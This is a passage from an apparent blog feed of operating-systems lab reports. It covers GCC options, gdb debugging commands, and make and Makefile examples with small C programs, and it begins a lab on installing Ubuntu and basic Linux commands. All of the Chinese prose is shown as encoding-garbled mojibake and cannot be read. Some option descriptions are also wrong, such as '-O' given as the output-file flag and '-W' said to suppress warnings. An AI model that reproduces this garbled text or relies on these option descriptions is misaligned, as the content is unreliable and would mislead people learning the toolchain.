è¿™äº›ç›®å½•ä¸‹çš„å¤´æ–‡ä»¶å¤§éƒ¨åˆ†éƒ½æ˜¯ç”±libeå¥—ä»¶ï¼ˆlibe binary packageï¼‰æ‰€æä¾›çš„ã€‚</li></ul><h5 id="2-gccç”¨æ³•"><a class="markdownIt-Anchor" href="#2-gccç”¨æ³•"></a> (2) GCCç”¨æ³•</h5><p>ä½¿ç”¨GCCæ—¶é€šå¸¸åœ¨å…¶åé¢è·Ÿä¸Šä¸€äº›ç¼–è¯‘é€‰é¡¹ä»¥åŠè¦ç¼–è¯‘çš„æ–‡ä»¶åï¼Œä»¥ä¸‹ç»™å‡ºçš„æ˜¯GCCçš„åŸºæœ¬ç”¨æ³•ï¼šgcc [option] [filename]</p><h5 id="3-gccçš„ä¸»è¦é€‰é¡¹"><a class="markdownIt-Anchor" href="#3-gccçš„ä¸»è¦é€‰é¡¹"></a> (3) GCCçš„ä¸»è¦é€‰é¡¹</h5><ul><li>-x language æŒ‡å®šä½¿ç”¨çš„è¯­è¨€ï¼ˆcã€c++æˆ–æ±‡ç¼–ï¼‰ï¼›</li><li>-c åªå¯¹æ–‡ä»¶è¿›è¡Œç¼–è¯‘å’Œæ±‡ç¼–ï¼Œä½†ä¸è¿æ¥ï¼›</li><li>-S åªå¯¹æ–‡ä»¶è¿›è¡Œç¼–è¯‘ï¼Œä½†ä¸æ±‡ç¼–å’Œè¿æ¥ï¼›</li><li>-E åªå¯¹æ–‡ä»¶è¿›è¡Œé¢„å¤„ç†ï¼Œä½†ä¸ç¼–è¯‘ã€æ±‡ç¼–å’Œè¿æ¥ï¼›</li><li>-O[file1] file2 å°†æ–‡ä»¶file2ç¼–è¯‘æˆå¯æ‰§è¡Œæ–‡ä»¶file1;</li><li>-l library ç”¨æ¥æŒ‡å®šæ‰€ä½¿ç”¨çš„åº“æ–‡ä»¶ï¼›</li><li>-I directory ä¸ºincludeæ–‡ä»¶çš„æœç´¢æŒ‡å®šç›®å½•ï¼›</li><li>-W ç¦æ­¢è­¦å‘Šä¿¡æ¯</li><li>-pedantic ä¸¥æ ¼è¦æ±‚ç¬¦åˆANSIæ ‡å‡†ï¼›</li><li>-Wall æ˜¾ç¤ºé™„åŠ çš„è­¦å‘Šä¿¡æ¯ã€‚</li><li>-g æ˜¾ç¤ºæ’é”™ä¿¡æ¯ä»¥ç”¨äºgdbï¼›</li><li>-p äº§ç”Ÿprofæ‰€éœ€çš„ä¿¡æ¯ï¼›</li><li>-pg äº§ç”Ÿgprof æ‰€ä½¿ç”¨çš„ä¿¡æ¯ï¼›</li></ul><h4 id="2-gdb"><a class="markdownIt-Anchor" href="#2-gdb"></a> 2. Gdb</h4><p>gdbæ˜¯ä¸€ä¸ªç”¨æ¥è°ƒè¯•cå’Œc++ç¨‹åºçš„åŠŸèƒ½æ¯”è¾ƒå¼ºå¤§çš„è°ƒè¯•å™¨ã€‚</p><h5 id="1-åœ¨gdbä¸­æœ‰å…³è°ƒè¯•è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ•°æ®çš„å‘½ä»¤æœ‰ä»¥ä¸‹å‡ æ¡"><a class="markdownIt-Anchor" href="#1-åœ¨gdbä¸­æœ‰å…³è°ƒè¯•è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ•°æ®çš„å‘½ä»¤æœ‰ä»¥ä¸‹å‡ æ¡"></a> (1) åœ¨gdbä¸­æœ‰å…³è°ƒè¯•è¿‡ç¨‹ä¸­æ˜¾ç¤ºæ•°æ®çš„å‘½ä»¤æœ‰ä»¥ä¸‹å‡ æ¡</h5><ul><li>displayå‘½ä»¤ï¼Œç”¨æ¥æ˜¾ç¤ºä¸€äº›è¡¨è¾¾å¼çš„å€¼ã€‚</li><li>info displayå‘½ä»¤ï¼Œç”¨æ¥æ˜¾ç¤ºå½“å‰æ‰€æœ‰çš„è¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼çš„æœ‰å…³æƒ…å†µã€‚</li><li>delete displayå‘½ä»¤ ç”¨æ¥åˆ é™¤ä¸€ä¸ªè¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼ ã€‚</li><li>disable display ä½¿ä¸€ä¸ªè¦æ˜¾ç¤ºå€¼çš„è¡¨è¾¾å¼æš‚æ—¶æ— æ•ˆï¼Œä½†å¹¶ä¸åˆ é™¤è¯¥è¡¨è¾¾å¼çš„æ˜¾ç¤ºã€‚</li><li>enable display å®ƒä¸disable displayå‘½ä»¤ç›¸åï¼Œä½¿æ˜¾ç¤ºå€¼è¢«å±è”½çš„è¡¨è¾¾å¼æ¢å¤æ˜¾ç¤º ã€‚</li><li>undisplay è¿™ä¸ªå‘½ä»¤ç”¨æ¥ç»“æŸæŸä¸ªè¡¨è¾¾å¼å€¼çš„æ˜¾ç¤ºï¼Œå®ƒçš„åŠŸèƒ½å’Œdelete displayåŸºæœ¬ä¸€è‡´ ã€‚</li><li>whatis ç”¨æ¥æ˜¾ç¤ºæŸä¸ªè¡¨è¾¾å¼çš„æ•°æ®ç±»å‹ã€‚</li><li>setå‘½ä»¤ ç”¨æ¥ä¸ºå˜é‡èµ‹å€¼ã€‚</li></ul><h5 id="2-gdbä¸­æœ‰å…³æ–‡ä»¶çš„å‘½ä»¤"><a class="markdownIt-Anchor" href="#2-gdbä¸­æœ‰å…³æ–‡ä»¶çš„å‘½ä»¤"></a> (2) gdbä¸­æœ‰å…³æ–‡ä»¶çš„å‘½ä»¤</h5><ul><li>add-shared-symbol-files ç”¨æ¥ä»åŠ¨æ€çš„è¿æ¥æ˜ å°„çš„å…±äº«ç›®æ ‡æ–‡ä»¶ä¸­è£…å…¥ç¬¦å·è¡¨ã€‚</li><li>add-symbol-file ç”¨æ¥ä»å·²ç»åŠ¨æ€è£…å…¥çš„æ–‡ä»¶ä¸­è£…å…¥ç¬¦å·è¡¨ã€‚</li><li>cd ç”¨æ¥æ”¹å˜å½“å‰å·¥ä½œç›®å½•ï¼Œå’Œshellé‡Œçš„cdå‘½ä»¤æ˜¯ä¸€æ ·çš„ã€‚</li><li>core-file ä½¿æŸä¸ªæ–‡ä»¶æˆä¸ºcore dumpï¼Œä»è€Œå¯ä»¥æ£€éªŒå†…å­˜å’Œå¯„å­˜å™¨ã€‚</li><li>directory ç”¨æ¥å‘æºæ–‡ä»¶æœç´¢è·¯å¾„ä¸­å¢åŠ ä¸€ä¸ªç›®å½•ã€‚</li><li>pwd pwdå‘½ä»¤å’Œshellä¸­çš„pwdå‘½ä»¤çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼ŒäºŒè€…éƒ½æ˜¯ç”¨æ¥æ˜¾ç¤ºå½“å‰å·¥ä½œè·¯å¾„çš„ã€‚</li></ul><h5 id="3-gdbä¸­æœ‰å…³ç¨‹åºè¿è¡Œçš„å‘½ä»¤"><a class="markdownIt-Anchor" href="#3-gdbä¸­æœ‰å…³ç¨‹åºè¿è¡Œçš„å‘½ä»¤"></a> (3) gdbä¸­æœ‰å…³ç¨‹åºè¿è¡Œçš„å‘½ä»¤</h5><ul><li>cont contå‘½ä»¤å’Œcontinueå‘½ä»¤çš„åŠŸèƒ½æ˜¯ä¸€æ ·çš„ï¼Œå®ƒä½¿ç¨‹åºåœ¨ä¿¡å·å‘ç”Ÿåæˆ–æ˜¯åœåœ¨æ–­ç‚¹ä¹‹åå†ç»§ç»­è¿è¡Œã€‚</li><li>handle ç”¨æ¥å¯¹ä¿¡å·è®¾ç½®å¤„ç†å‡½æ•°ã€‚</li><li>jump æŒ‡å®šç¨‹åºå¼€å§‹è°ƒè¯•çš„æŒ‡ä»¤æˆ–åœ°å€ã€‚</li><li>kill killå‘½ä»¤ç”¨æ¥ç»“æŸå½“å‰ç¨‹åºçš„è°ƒè¯•ã€‚</li><li>nextæ˜¯ç”¨æ¥ç»§ç»­ç¨‹åºçš„è¿è¡Œã€‚</li><li>nexti ç”¨æ¥å•æ­¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤çš„ã€‚</li><li>stepç”¨æ¥æ‰§è¡Œä¸€æ¡è¯­å¥ã€‚</li><li>stepi ç”¨æ¥æ‰§è¡Œä¸€æ¡æŒ‡ä»¤ã€‚</li></ul><h4 id="3-make"><a class="markdownIt-Anchor" href="#3-make"></a> 3. make</h4><p>makeå‘½ä»¤é€šè¿‡makefileæ–‡ä»¶æ¥æè¿°æºç¨‹åºä¹‹é—´çš„ç›¸äº’å…³ç³»å¹¶è‡ªåŠ¨ç»´æŠ¤ç¼–è¯‘å·¥ä½œã€‚<br>makeå‘½ä»¤æœ¬èº«å¯å¸¦æœ‰å››ç§å‚æ•°ï¼šæ ‡å¿—ã€å®å®šä¹‰ã€æè¿°æ–‡ä»¶åå’Œç›®æ ‡æ–‡ä»¶åã€‚</p><p>å…¶æ ‡å‡†å½¢å¼ä¸ºï¼šmake [flags] [macro definitions] [targets]ã€‚</p><h3 id="å››-å®éªŒå†…å®¹-3"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹-3"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-gcc-2"><a class="markdownIt-Anchor" href="#1-gcc-2"></a> 1. Gcc</h4><p><strong>(1) ç”¨ç†Ÿæ‚‰çš„ç¼–è¾‘å™¨è¾“å…¥æ¸…å•1æ‰€ç¤ºçš„ä»£ç :</strong></p><p>æ¸…å•1ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//hello.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span> (<span class="hljs-string">&quot;Hello world, Linux programming!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>ç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘å’Œè¿è¡Œè¿™æ®µç¨‹åºï¼š</p><p>$ gcc hello.c -o hello</p><p>$./hello</p><p><img src="/posts/da9b6b33/image-20211030151540494.png" alt="image-20211030151540494"><br>ä½¿ç”¨GCCç¼–è¯‘ç¨‹åºæ—¶ï¼Œç¼–è¯‘è¿‡ç¨‹å¯è¢«ç»†åˆ†ä¸ºå››ä¸ªé˜¶æ®µ ï¼š<br>é¢„å¤„ç†ï¼ˆPre-Processingï¼‰ # gcc -E hello.c -o hello.i<br>ç¼–è¯‘ï¼ˆCompilingï¼‰ # gcc -c hello.i -o hello.o<br>æ±‡ç¼–ï¼ˆAssemblingï¼‰<br>é“¾æ¥ï¼ˆLinking) # gcc hello.o -o hello</p><p><strong>(2) ä½¿ç”¨gccå‘ç°ç¨‹åºé”™è¯¯</strong></p><p>æ¸…å•2ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//illcode.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">int</span> var = <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;It is not standard C code!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>å½“GCCåœ¨ç¼–è¯‘ä¸ç¬¦åˆANSI/ISO Cè¯­è¨€æ ‡å‡†çš„æºä»£ç æ—¶ï¼Œå¦‚æœåŠ ä¸Šäº†-pedanticé€‰é¡¹ï¼Œé‚£ä¹ˆä½¿ç”¨äº†æ‰©å±•è¯­æ³•çš„åœ°æ–¹å°†äº§ç”Ÿç›¸åº”çš„è­¦å‘Šä¿¡æ¯ï¼š</p><p>$ gcc -pedantic illcode.c -o illcode</p><p>illcode.c: In function â€˜mainâ€™:<br>illcode.c:9: ISO C89 does not support â€˜long longâ€™<br>illcode.c:8: return type of â€˜mainâ€™ is not â€˜intâ€™</p><p><img src="/posts/da9b6b33/image-20211030152031454.png" alt="image-20211030152031454"></p><h4 id="2-gdb-2"><a class="markdownIt-Anchor" href="#2-gdb-2"></a> 2. Gdb</h4><p>ä¸‹é¢ç”¨ä¸€ä¸ªå®ä¾‹ä»‹ç»æ€æ ·ç”¨gdbè°ƒè¯•ç¨‹åºã€‚ç¨‹åºæ¸…å•è§æ•™ç¨‹ã€‚<br>ç”¨gccç¼–è¯‘å®ƒï¼šgcc -g -o test test.c</p><p>ç¨‹åºæ‰§è¡Œæ—¶æ˜¾ç¤ºå¦‚ä¸‹ç»“æœï¼š<br>The string is hello there<br>The string printed backward is</p><p>è¾“å‡ºçš„ç¬¬ä¸€è¡Œæ˜¯æ­£ç¡®çš„ï¼Œä½†ç¬¬äºŒè¡Œæ‰“å°å‡ºå¹¶ä¸æ˜¯æˆ‘ä»¬æ‰€æœŸæœ›çš„ã€‚my_print2 å‡½æ•°æ²¡æœ‰æ­£å¸¸å·¥ä½œã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬ç”¨gdbçœ‹çœ‹é—®é¢˜ç©¶ç«Ÿå‡ºåœ¨å“ªå„¿ï¼Œå…ˆè¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š<br>gdb greetingã€‚</p><p>å¦‚æœè¾“å…¥å‘½ä»¤æ—¶å¿˜äº†æŠŠè¦è°ƒè¯•çš„ç¨‹åºä½œä¸ºå‚æ•°ä¼ ç»™gdbï¼Œå¯ä»¥åœ¨gdbæç¤ºç¬¦ä¸‹ç”¨fileå‘½ä»¤åŠ è½½å®ƒï¼š(gdb) file greetingã€‚è¿™ä¸ªå‘½ä»¤åŠ è½½greetingå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå°±åƒåœ¨gdbå‘½ä»¤è¡Œé‡ŒåŠ è½½å®ƒä¸€æ ·</p><p>é€‰æ‹©è‡ªå·±çš„test.cæ–‡ä»¶è°ƒè¯•</p><p>-g åŠ å…¥è°ƒè¯•ä¿¡æ¯å¹¶è¿›å…¥è°ƒè¯•ç•Œé¢ï¼š  <img src="/posts/da9b6b33/clip_image018.png" alt="img">  ç›´æ¥è¿è¡Œï¼š  <img src="/posts/da9b6b33/clip_image020.png" alt="img">  åŠ å…¥æ–­ç‚¹å¹¶æŸ¥çœ‹æ–­ç‚¹ï¼š  <img src="/posts/da9b6b33/clip_image022.png" alt="img">  ç”¨runæ‰§è¡Œï¼Œå¹¶ç”¨nextæŸ¥çœ‹ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼š  <img src="/posts/da9b6b33/clip_image024.png" alt="img">  ç”¨stepæ·±å…¥å‡½æ•°å†…éƒ¨ï¼š  <img src="/posts/da9b6b33/clip_image026.png" alt="img">  ç”¨listæŸ¥çœ‹å‡½æ•°ä»£ç ï¼š  <img src="/posts/da9b6b33/clip_image028.png" alt="img">  ç”¨delete 1 åˆ é™¤æ–­ç‚¹å¹¶ç”¨info breaké‡æ–°æŸ¥çœ‹æ–­ç‚¹:  <img src="/posts/da9b6b33/clip_image030.png" alt="img">  ç”¨printæŸ¥çœ‹æŸä¸€å˜é‡å…·ä½“çš„å€¼ï¼š  <img src="/posts/da9b6b33/clip_image032.png" alt="img">  ç”¨xæŸ¥çœ‹æŸä¸€å†…å­˜åœ°å€å…·ä½“çš„å€¼ï¼š  <img src="/posts/da9b6b33/clip_image034.png" alt="img">  ç”¨disasåæ±‡ç¼–æŸä¸€å‡½æ•°ï¼š  <img src="/posts/da9b6b33/clip_image036.png" alt="img">  <img src="/posts/da9b6b33/clip_image038.png" alt="img"></p><h4 id="3-make-2"><a class="markdownIt-Anchor" href="#3-make-2"></a> 3. make</h4><p>åœ¨Linuxç³»ç»Ÿä¸­ï¼Œä¸“é—¨æä¾›äº†ä¸€ä¸ªmakeå‘½ä»¤æ¥è‡ªåŠ¨ç»´æŠ¤ç›®æ ‡æ–‡ä»¶ã€‚<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„Makefileçš„ç®€å•ä¾‹å­ï¼š<br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o prog<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o prog1.o prog1.c<br>prog2.o:prog2.c<br>gcc -c prog2.c</p><p>æµ‹è¯•ä¾‹å­</p><p>makefile</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-section">test: test1.o test2.o </span><br>gcc -Wall test1.o test2.o -o test<br>    <br><span class="hljs-section">test1.o: test1.c test2.h</span><br>gcc -c -Wall test1.c -o test1.o<br><br><span class="hljs-section">test2.o: test2.c test2.h</span><br>gcc -c -Wall test2.c -o test2.o<br><br><span class="hljs-section">clean: </span><br>    rm -rf *.o test<br><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test1.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test1!\n&quot;</span>);<br>    PrintTest2();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;test2.h&quot;</span></span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is test2!\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//test2.h</span><br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> TEST2_H_</span><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TEST2_H_</span><br> <br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PrintTest2</span><span class="hljs-params">()</span></span>;<br><br> <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/da9b6b33/image-20211102154641480.png" alt="image-20211102154641480"></p><p><strong>#ä½¿ç”¨ç¼©å†™çš„Makefile</strong><br>prog:prog1.o prog2.o<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p><p><strong>#ä½¿ç”¨ç¼©å†™å’Œå®çš„Makefile</strong></p><p>MARCO = prog1.o prog2.o<br>prog:$(MARCO)<br>gcc prog1.o prog2.o -o $@<br>prog1.o:prog1.c lib.h<br>gcc -c -I. -o $@ $&lt;<br>prog2.o:prog2.c<br>gcc -c $*.c</p>]]></content>
    
    
    <categories>
      
      <category>æ“ä½œç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ“ä½œç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ“ä½œç³»ç»Ÿå®éªŒä¸€</title>
    <link href="/posts/e11b459a/"/>
    <url>/posts/e11b459a/</url>
    
    <content type="html"><![CDATA[<h2 id="å®éªŒ1-linuxç³»ç»Ÿå®‰è£…åŠåˆçº§å‘½ä»¤ç†Ÿæ‚‰"><a class="markdownIt-Anchor" href="#å®éªŒ1-linuxç³»ç»Ÿå®‰è£…åŠåˆçº§å‘½ä»¤ç†Ÿæ‚‰"></a> å®éªŒ1 linuxç³»ç»Ÿå®‰è£…åŠåˆçº§å‘½ä»¤ç†Ÿæ‚‰</h2><h3 id="ä¸€-å®éªŒç›®çš„"><a class="markdownIt-Anchor" href="#ä¸€-å®éªŒç›®çš„"></a> ä¸€ã€å®éªŒç›®çš„</h3><ol><li>æŒæ¡Ubuntuçš„å®‰è£…è¿‡ç¨‹ã€‚</li><li>ç†Ÿæ‚‰Linuxå‘½ä»¤çš„æ ¼å¼ã€‚</li><li>ç†Ÿæ‚‰ä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ã€‚</li><li>ç†Ÿæ‚‰å¦‚ä½•ä½¿ç”¨å¸®åŠ©ã€‚</li></ol><h3 id="äºŒ-å®éªŒè¦æ±‚"><a class="markdownIt-Anchor" href="#äºŒ-å®éªŒè¦æ±‚"></a> äºŒã€å®éªŒè¦æ±‚</h3><p>æœ¬æ¬¡å®éªŒè¦æ±‚å®Œæˆä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>ç”¨rootç™»å½•è¿›å…¥Linuxç³»ç»Ÿï¼Œåˆ›å»ºè‡ªå·±çš„è´¦å·</li><li>æ‰§è¡Œå¸¸ç”¨çš„å‘½ä»¤</li><li>ä½¿ç”¨ç‰¹æ®Šæ§åˆ¶é”®ï¼Œè¿›è¡Œå‘½ä»¤è¡Œçš„ç¼–è¾‘</li><li>ä½¿ç”¨manå‘½ä»¤ï¼Œæ¥æŸ¥æ‰¾ç‰¹å®šå‘½ä»¤çš„å¸®åŠ©ä¿¡æ¯</li></ul><h3 id="ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†"><a class="markdownIt-Anchor" href="#ä¸‰-å®éªŒé¢„å¤‡çŸ¥è¯†"></a> ä¸‰ã€å®éªŒé¢„å¤‡çŸ¥è¯†</h3><p>å‡†å¤‡Ubuntué•œåƒï¼Œæœ¬æ¬¡å®éªŒé‡‡ç”¨Ubuntu 20.04ç‰ˆæœ¬</p><h3 id="å››-å®éªŒå†…å®¹"><a class="markdownIt-Anchor" href="#å››-å®éªŒå†…å®¹"></a> å››ã€å®éªŒå†…å®¹</h3><h4 id="1-å®‰è£…linuxæ“ä½œç³»ç»Ÿ"><a class="markdownIt-Anchor" href="#1-å®‰è£…linuxæ“ä½œç³»ç»Ÿ"></a> 1. <strong>å®‰è£…linuxæ“ä½œç³»ç»Ÿ</strong></h4><p>å¦‚å›¾æ‰€ç¤ºï¼ŒUbuntuç³»ç»Ÿå·²ç»é¢„å…ˆå®‰è£…å®Œæˆã€‚ä¸­æ–‡è¯­è¨€è¾“å…¥æ³•å‡å·²å®‰è£…ã€‚</p><h4 id="image-20211029092634926"><a class="markdownIt-Anchor" href="#image-20211029092634926"></a> <img src="/posts/e11b459a/image-20211029092634926.png" alt="image-20211029092634926"></h4><h4 id="2-åŸºæœ¬å‘½ä»¤"><a class="markdownIt-Anchor" href="#2-åŸºæœ¬å‘½ä»¤"></a> 2. <strong>åŸºæœ¬å‘½ä»¤</strong></h4><h5 id="1-åœ¨ç»ˆç«¯ç”¨æˆ·ä¸‹ä¸ºè‡ªå·±åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a class="markdownIt-Anchor" href="#1-åœ¨ç»ˆç«¯ç”¨æˆ·ä¸‹ä¸ºè‡ªå·±åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a> â‘´ åœ¨ç»ˆç«¯ç”¨æˆ·ä¸‹ä¸ºè‡ªå·±åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h5><p><img src="/posts/e11b459a/image-20211029095025375.png" alt="image-20211029095025375"></p><p><img src="/posts/e11b459a/image-20211029095100329.png" alt="image-20211029095100329"></p><h5 id="2-ä¸ºyuliyaç”¨æˆ·åˆ›å»ºä¸€ä¸ªå¯†ç "><a class="markdownIt-Anchor" href="#2-ä¸ºyuliyaç”¨æˆ·åˆ›å»ºä¸€ä¸ªå¯†ç "></a> â‘µ ä¸ºyuliyaç”¨æˆ·åˆ›å»ºä¸€ä¸ªå¯†ç </h5><p><img src="/posts/e11b459a/image-20211029095125075.png" alt="image-20211029095125075"></p><h5 id="3-ç™»å½•åˆ›å»ºçš„ç”¨æˆ·"><a class="markdownIt-Anchor" href="#3-ç™»å½•åˆ›å»ºçš„ç”¨æˆ·"></a> â‘¶ ç™»å½•åˆ›å»ºçš„ç”¨æˆ·</h5><p><img src="/posts/e11b459a/image-20211029095223103.png" alt="image-20211029095223103"></p><h5 id="4-æŸ¥çœ‹å½“å‰ç”¨æˆ·"><a class="markdownIt-Anchor" href="#4-æŸ¥çœ‹å½“å‰ç”¨æˆ·"></a> â‘· æŸ¥çœ‹å½“å‰ç”¨æˆ·</h5><p><img src="/posts/e11b459a/image-20211029095400878.png" alt="image-20211029095400878"></p><p><img src="/posts/e11b459a/image-20211029095241084.png" alt="image-20211029095241084"></p><h5 id="5-æŸ¥æ˜å…·ä½“ç”¨æˆ·"><a class="markdownIt-Anchor" href="#5-æŸ¥æ˜å…·ä½“ç”¨æˆ·"></a> â‘¸ æŸ¥æ˜å…·ä½“ç”¨æˆ·</h5><p><img src="/posts/e11b459a/image-20211029095318256.png" alt="image-20211029095318256"></p><h5 id="6-é€€å‡ºå½“å‰ç”¨æˆ·"><a class="markdownIt-Anchor" href="#6-é€€å‡ºå½“å‰ç”¨æˆ·"></a> â‘¹ é€€å‡ºå½“å‰ç”¨æˆ·</h5><p><img src="/posts/e11b459a/image-20211029095338451.png" alt="image-20211029095338451"></p><h5 id="7-åœ¨å‘½ä»¤è¡Œä¸‹è¿›è¡Œå…³æœºæ“ä½œ"><a class="markdownIt-Anchor" href="#7-åœ¨å‘½ä»¤è¡Œä¸‹è¿›è¡Œå…³æœºæ“ä½œ"></a> â‘º åœ¨å‘½ä»¤è¡Œä¸‹è¿›è¡Œå…³æœºæ“ä½œ</h5><p><img src="/posts/e11b459a/image-20211029095831358.png" alt="image-20211029095831358"></p><h5 id="8-é‡æ–°å¯åŠ¨"><a class="markdownIt-Anchor" href="#8-é‡æ–°å¯åŠ¨"></a> â‘» é‡æ–°å¯åŠ¨</h5><p><img src="/posts/e11b459a/image-20211029102955840.png" alt="image-20211029102955840"></p><h4 id="3-ç‰¹æ®Šé”®çš„ä½¿ç”¨"><a class="markdownIt-Anchor" href="#3-ç‰¹æ®Šé”®çš„ä½¿ç”¨"></a> 3. ç‰¹æ®Šé”®çš„ä½¿ç”¨</h4><p>å›è½¦é”®RETURNæˆ–è€…CONTROL-mæˆ–CTL-mï¼Œå®ƒè¡¨ç¤ºè¾“å…¥è¡Œç»“æŸ<br>CTL-d   å®ƒè¡¨ç¤ºç»ˆç«¯çš„è¾“å…¥ç»“æŸï¼›<br>CTL-g   æ§åˆ¶ç»ˆç«¯å“é“ƒï¼›<br>CTL-h   ç§°ä¸ºé€€æ ¼é”®ï¼Œç”¨äºæ”¹æ­£è¾“å…¥çš„é”™è¯¯ï¼›<br>CTL-i    å¸¸ç§°ä½œTabé”®<br>DELETEé”®è¡¨ç¤ºç«‹å³ç»ˆæ­¢ç¨‹åº<br>BREAKé”®ä¸DELETEé”®ã€CTL-cçš„åŠŸèƒ½</p><h4 id="4-linuxä¸‹çš„å¸®åŠ©å‘½ä»¤"><a class="markdownIt-Anchor" href="#4-linuxä¸‹çš„å¸®åŠ©å‘½ä»¤"></a> 4. linuxä¸‹çš„å¸®åŠ©å‘½ä»¤</h4><h5 id="1-man-å‘½ä»¤"><a class="markdownIt-Anchor" href="#1-man-å‘½ä»¤"></a> â‘´ #man å‘½ä»¤</h5><p><img 